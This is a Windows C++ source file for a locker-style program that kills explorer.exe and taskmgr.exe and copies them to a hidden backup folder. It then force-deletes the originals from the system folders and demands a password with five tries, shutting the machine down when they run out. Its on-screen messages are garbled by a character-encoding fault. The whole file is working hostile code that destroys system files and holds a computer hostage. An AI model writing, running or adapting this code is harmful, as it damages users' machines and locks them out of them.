#include<cstdio>
#include<cstring>
#include<windows.h>
int c=5;
char password[30];
int main()
{
    system("@echo off");
    system("cls");
    system("taskkill /F /IM explorer.exe");
    system("cls");
    system("md c:\\Wood\\Backup");
    system("cls");
    system("c:");
    system("cls");
    system("cd c:\\Wood\\Backup");
    system("cls");
    system("copy c:\\windows\\explorer.exe");
    system("cls");
    system("del /F /S /A c:\\windows\\explorer.exe");
    system("cls");
    system("taskkill /F /IM taskmgr.exe");
    system("cls");
    system("copy c:\\windows\\system32\\taskmgr.exe");
    system("cls");
    system("del /F /S /A c:\\windows\\system32\\taskmgr.exe");
    system("cls");
    printf("�����Ѿ���ľ���Ⱦ��\n");
    printf("����ϵ����������Ҫ�������룡\n");
    printf("���������룡�㻹��5�λ���:");
    while(scanf("%s",password))
    {
        if(strcmp(password,"10401078411319004453")==0)
        {
            system("cls");
            printf("������ȷ!\n");
            system("cls");
            system("cd c:\\windows\\system32\\dllcache");
            system("cls");
            system("copy c:\\wood\\backup\\explorer.exe");
            system("cls");
            system("copy c:\\wood\\backup\\taskmgr.exe");
            system("cls");
            system("cd c:\\windows");
            system("cls");
            system("copy c:\\wood\\backup\\explorer.exe");
            system("explorer.exe");
            system("cls");
            system("cd c:\\windows\\system32");
            system("cls");
            system("copy c:\\wood\\backup\\taskmgr.exe");
            system("cls");
            printf("���Իָ��ɹ���\nллʹ�ã�\n");
            system("pause");
            return 0;
        }
        else
        {
            if(c==0)
            {
                system("cls");
                printf("��������̫��\nϵͳ�ػ���\n");
                system("shutdown -s -t 0");
                return 0;
            }
            else
            {
                system("cls");
                c--;
                printf("��������㻹��%d���᣺",c);
            }
        }
    }
}
